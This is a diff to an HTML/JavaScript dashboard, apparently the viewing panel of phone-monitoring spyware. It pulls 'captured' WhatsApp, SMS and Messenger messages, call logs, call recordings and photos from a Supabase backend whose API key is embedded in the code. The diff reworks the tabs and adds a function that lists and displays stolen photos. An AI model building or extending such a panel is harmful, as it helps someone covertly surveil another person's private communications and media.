@@ -11,7 +11,7 @@ body { background:#f0f0f0; font-family:sans-serif; }
 .header h1 { font-size:22px; }
 .header p { font-size:12px; color:#aaa; margin-top:4px; }
 .grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; padding:12px; }
-.card { border-radius:10px; padding:20px; color:white; display:flex; flex-direction:column; align-items:flex-end; min-height:120px; cursor:pointer; text-decoration:none; }
+.card { border-radius:10px; padding:20px; color:white; display:flex; flex-direction:column; align-items:flex-end; min-height:120px; cursor:pointer; }
 .card .num { font-size:42px; font-weight:bold; }
 .card .label { font-size:13px; letter-spacing:1px; margin-top:4px; }
 .card.blue { background:#3498db; }
@@ -22,7 +22,6 @@ body { background:#f0f0f0; font-family:sans-serif; }
 .card.teal { background:#1abc9c; }
 .card.dark { background:#2c3e50; }
 .card.pink { background:#e91e8c; }
-
 .section { margin:12px; background:white; border-radius:10px; overflow:hidden; }
 .section-title { background:#2c3e50; color:white; padding:12px 16px; font-size:14px; letter-spacing:1px; }
 .msg { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
@@ -34,23 +33,23 @@ body { background:#f0f0f0; font-family:sans-serif; }
 .call .info .name { font-weight:bold; color:#2c3e50; font-size:14px; }
 .call .info .type { font-size:12px; color:#999; }
 .call .time { font-size:11px; color:#bbb; }
-.tabs { display:flex; background:white; border-bottom:2px solid #f0f0f0; }
-.tab { flex:1; padding:12px; text-align:center; font-size:13px; cursor:pointer; color:#999; border-bottom:3px solid transparent; }
+.tabs { display:flex; background:white; border-bottom:2px solid #f0f0f0; overflow-x:auto; }
+.tab { flex:1; padding:12px 8px; text-align:center; font-size:12px; cursor:pointer; color:#999; border-bottom:3px solid transparent; white-space:nowrap; }
 .tab.active { color:#3498db; border-bottom:3px solid #3498db; font-weight:bold; }
-#detail { display:none; }
-audio { width:100%; margin-top:8px; }
+.photo-grid { display:grid; grid-template-columns:1fr 1fr 1fr; gap:4px; padding:4px; }
+.photo-grid img { width:100%; aspect-ratio:1; object-fit:cover; border-radius:4px; }
 .recording { padding:12px 16px; border-bottom:1px solid #f0f0f0; }
 .recording .name { font-size:13px; color:#2c3e50; font-weight:bold; }
+audio { width:100%; margin-top:8px; }
 </style>
 </head>
 <body>
-
 <div class="header">
   <h1>📡 Personal Hub</h1>
   <p>Axes Productivité Congo — <span id="lastUpdate"></span></p>
 </div>
 
-<div class="grid" id="dashboard">
+<div class="grid">
   <div class="card blue" onclick="showTab('messages')">
     <div class="num" id="cnt-msg">-</div>
     <div class="label">MESSAGES</div>
@@ -71,33 +70,38 @@ audio { width:100%; margin-top:8px; }
     <div class="num" id="cnt-rec">-</div>
     <div class="label">ENREGISTREMENTS</div>
   </div>
-  <div class="card green" onclick="showTab('photos')"><div class="num" id="cnt-photos">-</div><div class="label">PHOTOS</div></div><div class="card dark" onclick="showTab('messenger')">
+  <div class="card pink" onclick="showTab('photos')">
+    <div class="num" id="cnt-photos">-</div>
+    <div class="label">PHOTOS</div>
+  </div>
+  <div class="card dark" onclick="showTab('messenger')">
     <div class="num" id="cnt-msngr">-</div>
     <div class="label">MESSENGER</div>
   </div>
 </div>
 
-<div id="detail">
-  <div class="tabs">
-    <div class="tab active" id="tab-messages" onclick="showTab('messages')">Messages</div>
-    <div class="tab" id="tab-appels" onclick="showTab('appels')">Appels</div>
-    <div class="tab" id="tab-photos" onclick="showTab('photos')">Photos</div><div class="tab" id="tab-enregistrements" onclick="showTab('enregistrements')">Audio</div>
-  </div>
+<div class="tabs">
+  <div class="tab active" id="tab-messages" onclick="showTab('messages')">Messages</div>
+  <div class="tab" id="tab-appels" onclick="showTab('appels')">Appels</div>
+  <div class="tab" id="tab-enregistrements" onclick="showTab('enregistrements')">Audio</div>
+  <div class="tab" id="tab-photos" onclick="showTab('photos')">Photos</div>
+</div>
 
-  <div class="section" id="sec-messages" style="display:none">
-    <div class="section-title">💬 DERNIERS MESSAGES</div>
-    <div id="list-messages"></div>
-  </div>
-
-  <div class="section" id="sec-appels" style="display:none">
-    <div class="section-title">📞 JOURNAL D'APPELS</div>
-    <div id="list-appels"></div>
-  </div>
-
-  <div class="section" id="sec-photos" style="display:none"><div class="section-title">📷 PHOTOS</div><div id="list-photos" style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:4px;padding:4px"></div></div><div class="section" id="sec-enregistrements" style="display:none">
-    <div class="section-title">🎙️ ENREGISTREMENTS</div>
-    <div id="list-enregistrements"></div>
-  </div>
+<div class="section" id="sec-messages">
+  <div class="section-title">💬 DERNIERS MESSAGES</div>
+  <div id="list-messages"></div>
+</div>
+<div class="section" id="sec-appels" style="display:none">
+  <div class="section-title">📞 JOURNAL D'APPELS</div>
+  <div id="list-appels"></div>
+</div>
+<div class="section" id="sec-enregistrements" style="display:none">
+  <div class="section-title">🎙️ ENREGISTREMENTS</div>
+  <div id="list-enregistrements"></div>
+</div>
+<div class="section" id="sec-photos" style="display:none">
+  <div class="section-title">📷 PHOTOS</div>
+  <div class="photo-grid" id="list-photos"></div>
 </div>
 
 <script>
@@ -105,68 +109,61 @@ const URL = "https://wcgfvjunixmlojptkclp.supabase.co";
 const KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
 const H = { apikey: KEY, Authorization: "Bearer " + KEY };
 
-async function get(path) {
-  const r = await fetch(URL + path, { headers: H });
-  return r.json();
-}
-
-function fmt(d) {
-  return d ? new Date(d).toLocaleString("fr-FR") : "";
-}
+function fmt(d) { return d ? new Date(d).toLocaleString("fr-FR") : ""; }
 
 async function charger() {
   document.getElementById("lastUpdate").textContent = new Date().toLocaleTimeString("fr-FR");
+  const msgs = await fetch(URL+"/rest/v1/messages_capture?select=*&order=created_at.desc&limit=100",{headers:H}).then(r=>r.json());
+  const calls = await fetch(URL+"/rest/v1/call_logs?select=*&order=synced_at.desc&limit=100",{headers:H}).then(r=>r.json());
 
-  const msgs = await get("/rest/v1/messages_capture?select=*&order=created_at.desc&limit=100");
-  const calls = await get("/rest/v1/call_logs?select=*&order=synced_at.desc&limit=100");
-
-  // Compteurs
   document.getElementById("cnt-msg").textContent = msgs.length;
-  document.getElementById("cnt-wa").textContent = msgs.filter(m => m.app_source === "whatsapp").length;
-  document.getElementById("cnt-sms").textContent = msgs.filter(m => m.app_source === "sms").length;
-  document.getElementById("cnt-msngr").textContent = msgs.filter(m => m.app_source === "messenger").length;
+  document.getElementById("cnt-wa").textContent = msgs.filter(m=>m.app_source==="whatsapp").length;
+  document.getElementById("cnt-sms").textContent = msgs.filter(m=>m.app_source==="sms").length;
+  document.getElementById("cnt-msngr").textContent = msgs.filter(m=>m.app_source==="messenger").length;
   document.getElementById("cnt-calls").textContent = calls.length;
 
-  // Enregistrements
-  const recs = await get("/rest/v1/media_files?select=*&file_type=eq.audio&order=synced_at.desc&limit=50");
-  document.getElementById("cnt-rec").textContent = recs.length || "?";
-
-  // Liste messages
-  document.getElementById("list-messages").innerHTML = msgs.map(m => `
+  document.getElementById("list-messages").innerHTML = msgs.map(m=>`
     <div class="msg">
-      <div class="contact">${m.contact || "Inconnu"}</div>
-      <div class="source">${m.app_source || ""}</div>
-      <div class="text">${m.message || ""}</div>
+      <div class="contact">${m.contact||"Inconnu"}</div>
+      <div class="source">${m.app_source||""}</div>
+      <div class="text">${m.message||""}</div>
       <div class="time">${fmt(m.created_at)}</div>
     </div>`).join("");
 
-  // Liste appels
-  document.getElementById("list-appels").innerHTML = calls.map(c => `
+  document.getElementById("list-appels").innerHTML = calls.map(c=>`
     <div class="call">
       <div class="info">
-        <div class="name">${c.contact || c.phone_number || "Inconnu"}</div>
-        <div class="type">${c.call_type || ""} — ${c.duration_seconds || 0}s</div>
+        <div class="name">${c.contact||c.phone_number||"Inconnu"}</div>
+        <div class="type">${c.call_type||""} — ${c.duration_seconds||0}s</div>
       </div>
       <div class="time">${fmt(c.timestamp)}</div>
     </div>`).join("");
 
-  // Liste enregistrements
-  document.getElementById("list-enregistrements").innerHTML = recs.length > 0 ? recs.map(r => `
-    <div class="recording">
-      <div class="name">🎙️ ${r.file_name || ""}</div>
-      <div class="time">${fmt(r.synced_at)}</div>
-      <audio controls src="${URL}/storage/v1/object/public/call_recordings/${r.file_name}"></audio>
-    </div>`).join("") : "<div class='msg'><div class='text'>Enregistrements dans le bucket Supabase Storage</div></div>";
+  document.getElementById("list-enregistrements").innerHTML = `<div class="msg"><div class="text">Voir Supabase Storage → call_recordings</div></div>`;
+}
+
+async function chargerPhotos() {
+  const r = await fetch(URL+"/storage/v1/object/list/media", {
+    method:"POST",
+    headers:{...H,"Content-Type":"application/json"},
+    body:JSON.stringify({limit:50,offset:0,prefix:""})
+  });
+  const files = await r.json();
+  const photos = Array.isArray(files) ? files.filter(f=>f.name&&f.name.endsWith(".jpg")) : [];
+  document.getElementById("cnt-photos").textContent = photos.length;
+  document.getElementById("list-photos").innerHTML = photos.map(f=>
+    `<img src="${URL}/storage/v1/object/public/media/${f.name}" onerror="this.style.display='none'">`
+  ).join("");
 }
 
 function showTab(tab) {
-  document.getElementById("detail").style.display = "block";
-  ["messages","appels","enregistrements"].forEach(t => {
-    document.getElementById("sec-" + t).style.display = t === tab ? "block" : "none";
-    const el = document.getElementById("tab-" + t);
-    if (el) el.className = "tab" + (t === tab ? " active" : "");
+  ["messages","appels","enregistrements","photos"].forEach(t=>{
+    document.getElementById("sec-"+t).style.display = t===tab?"block":"none";
+    const el = document.getElementById("tab-"+t);
+    if(el) el.className = "tab"+(t===tab?" active":"");
   });
-  window.scrollTo(0, document.getElementById("detail").offsetTop);
+  if(tab==="photos") chargerPhotos();
+  window.scrollTo(0, document.querySelector(".tabs").offsetTop);
 }
 
 charger();
